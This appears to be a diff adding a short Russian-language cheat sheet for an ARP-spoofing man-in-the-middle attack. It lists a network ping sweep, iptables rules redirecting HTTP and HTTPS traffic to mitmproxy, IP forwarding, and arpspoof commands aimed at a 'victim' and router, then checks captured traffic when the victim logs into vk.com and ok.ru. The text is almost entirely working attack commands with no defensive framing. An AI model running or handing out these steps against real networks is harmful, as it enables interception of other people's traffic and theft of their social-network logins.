@@ -1,0 +1,53 @@
+//MITM атака (Man in the middle)
+https://www.youtube.com/watch?v=quZjKlrmCvQ
+
+//ping сканирование сети
+fping -Asg 192.168.1.0/24 -r 5 > out.txt
+cat out.txt | grep alive
+
+////////////////////////
+////На машине жертвы////
+////////////////////////
+//Определение ройтера
+route -n
+//Просмотр таблицы arp
+arp -a
+//Трассировка
+traceroute 8.8.8.8
+////////////////////////
+//END На машине жертвы//
+////////////////////////
+
+//Перенаправляем трафик с 80 порта
+iptables -t nat A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+iptables -t nat A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
+
+mitmproxy -T --host
+
+//IP-форвардинг
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+//Перенаправляем траффик
+arpspoof -i eth0 -t ip_жертвы id_роутера 
+
+//Мак адрес атакующего должеен стать как мак роутера
+arp -a
+
+////////////////////////
+////На машине жертвы////
+////////////////////////
+//Трафик должен пойти через машины атакующего
+traceroute 8.8.8.8
+//Открываем vk.com в браузере (эксплорер)
+////////////////////////
+//END На машине жертвы//
+////////////////////////
+
+
+//Анализ полученного
+//arpspoof
+ctrl+c
+//mitmproxy
+https://login.vk.com/?act=login
+https://www.ok.ru/https
+
